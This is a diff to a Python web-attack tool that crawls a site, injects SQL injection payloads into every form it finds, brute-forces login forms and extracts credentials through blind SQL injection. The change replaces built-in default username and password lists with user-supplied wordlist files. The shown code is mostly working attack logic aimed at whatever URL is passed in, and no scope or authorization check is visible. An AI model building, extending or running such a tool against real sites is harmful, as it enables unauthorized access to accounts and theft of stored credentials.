@@ -4,6 +4,7 @@ import urllib.parse
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin, urlparse
 from collections import deque
+import os
 
 # Common SQL injection payloads
 SQLI_PAYLOADS = [
@@ -17,13 +18,6 @@ SQLI_PAYLOADS = [
     '" OR ""="',
     "'--",
     '"--',
-]
-
-COMMON_USERNAMES = [
-    'admin', 'user', 'test', 'guest', 'root', 'administrator'
-]
-COMMON_PASSWORDS = [
-    'admin', 'admin123', 'password', '123456', 'test', 'guest', 'root'
 ]
 
 def test_sqli(url, params, method="GET", results=None):
@@ -75,7 +69,7 @@ def is_sqli_response(response_text):
             return True
     return False
 
-def brute_force_login(url, form_params, method="POST", success_indicator="Login successful!", results=None):
+def brute_force_login(url, form_params, method="POST", success_indicator="Login successful!", results=None, user_file=None, pass_file=None):
     print("\n[+] Starting brute-force credential testing...")
     username_field = None
     password_field = None
@@ -89,9 +83,20 @@ def brute_force_login(url, form_params, method="POST", success_indicator="Login 
     if not username_field or not password_field:
         print("[!] Could not identify username/password fields for brute-force.")
         return
+    # Require usernames and passwords from files only
+    if not user_file or not os.path.exists(user_file):
+        print("[!] Username list file (--userlist) is required for brute-force and was not found.")
+        return
+    if not pass_file or not os.path.exists(pass_file):
+        print("[!] Password list file (--passlist) is required for brute-force and was not found.")
+        return
+    with open(user_file, 'r', encoding='utf-8') as f:
+        usernames = [line.strip() for line in f if line.strip()]
+    with open(pass_file, 'r', encoding='utf-8') as f:
+        passwords = [line.strip() for line in f if line.strip()]
     found_creds = []
-    for username in COMMON_USERNAMES:
-        for password in COMMON_PASSWORDS:
+    for username in usernames:
+        for password in passwords:
             params = {username_field: username, password_field: password}
             try:
                 if method.upper() == "POST":
@@ -104,10 +109,10 @@ def brute_force_login(url, form_params, method="POST", success_indicator="Login 
                         results['creds'] = found_creds
                     return
             except Exception as e:
-                pass
+                print(f"[!] Error testing {username}/{password}: {e}")
     if results is not None:
         results['creds'] = found_creds
-    print("[-] No valid credentials found with common username/passwords.")
+    print("[-] No valid credentials found with provided username/password lists.")
 
 def blind_sqli_extract(url, form_params, method="POST", success_indicator="Login successful!", max_length=20, max_users=5, results=None):
     print("\n[+] Starting blind SQLi extraction (fresh crack, multi-user)...")
@@ -177,7 +182,7 @@ def blind_sqli_extract(url, form_params, method="POST", success_indicator="Login
     if results is not None:
         results['creds'] = extracted_creds
 
-def auto_test_forms(url, crack_lists=False, fresh_crack=False, results=None):
+def auto_test_forms(url, crack_lists=False, fresh_crack=False, results=None, user_file=None, pass_file=None):
     print(f"[+] Fetching {url} and searching for forms...")
     try:
         resp = requests.get(url, timeout=5)
@@ -201,10 +206,8 @@ def auto_test_forms(url, crack_lists=False, fresh_crack=False, results=None):
             print(f"\n[+] Testing form #{idx}: {form_url} [{method}] with params: {param_str}")
             form_result = {'url': form_url, 'sqli': [], 'creds': []}
             test_sqli(form_url, param_str, method, results=form_result)
-            # If crack_lists is set, use brute-force only
             if crack_lists:
-                brute_force_login(form_url, param_str, method, results=form_result)
-            # If fresh_crack is set and crack_lists is not, use blind SQLi
+                brute_force_login(form_url, param_str, method, results=form_result, user_file=user_file, pass_file=pass_file)
             elif fresh_crack:
                 blind_sqli_extract(form_url, param_str, method, results=form_result)
             page_results.append(form_result)
@@ -213,7 +216,7 @@ def auto_test_forms(url, crack_lists=False, fresh_crack=False, results=None):
     except Exception as e:
         print(f"[!] Error fetching or parsing forms: {e}")
 
-def crawl_and_test(start_url, max_pages=10, crack_lists=False, fresh_crack=False, results=None, skip_urls=None):
+def crawl_and_test(start_url, max_pages=10, crack_lists=False, fresh_crack=False, results=None, skip_urls=None, user_file=None, pass_file=None):
     print(f"[+] Starting crawl from {start_url}")
     visited = set() if skip_urls is None else set(skip_urls)
     queue = deque([start_url])
@@ -230,7 +233,7 @@ def crawl_and_test(start_url, max_pages=10, crack_lists=False, fresh_crack=False
             soup = BeautifulSoup(resp.text, 'html.parser')
             print(f"\n[+] Crawling and testing: {url}")
             page_result = {}
-            auto_test_forms(url, crack_lists=crack_lists, fresh_crack=fresh_crack, results=page_result)
+            auto_test_forms(url, crack_lists=crack_lists, fresh_crack=fresh_crack, results=page_result, user_file=user_file, pass_file=pass_file)
             crawl_results.append({'url': url, 'pages': page_result.get('pages', [])})
             pages_tested += 1
             # Find and enqueue internal links
@@ -256,6 +259,8 @@ def main():
     parser.add_argument('--max-pages', type=int, default=10, help='Maximum number of pages to crawl')
     parser.add_argument('--crack_lists', action='store_true', help='Brute-force with common username/password lists')
     parser.add_argument('--fresh_crack', action='store_true', help='Extract credentials using blind SQLi only')
+    parser.add_argument('--userlist', type=str, help='File with usernames for brute-force (one per line)')
+    parser.add_argument('--passlist', type=str, help='File with passwords for brute-force (one per line)')
     args = parser.parse_args()
 
     print(f"Testing {args.url}")
@@ -263,13 +268,13 @@ def main():
     tested_urls = set()
     # If both --auto and --crawl are set, avoid duplicate testing
     if args.auto and args.crawl:
-        auto_test_forms(args.url, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results)
+        auto_test_forms(args.url, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results, user_file=args.userlist, pass_file=args.passlist)
         tested_urls.add(args.url.rstrip('/'))
-        crawl_and_test(args.url, args.max_pages, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results, skip_urls=tested_urls)
+        crawl_and_test(args.url, args.max_pages, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results, skip_urls=tested_urls, user_file=args.userlist, pass_file=args.passlist)
     elif args.auto:
-        auto_test_forms(args.url, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results)
+        auto_test_forms(args.url, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results, user_file=args.userlist, pass_file=args.passlist)
     elif args.crawl:
-        crawl_and_test(args.url, args.max_pages, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results)
+        crawl_and_test(args.url, args.max_pages, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results, user_file=args.userlist, pass_file=args.passlist)
     elif args.params:
         single_result = {'url': args.url, 'sqli': [], 'creds': []}
         test_sqli(args.url, args.params, args.method, results=single_result)
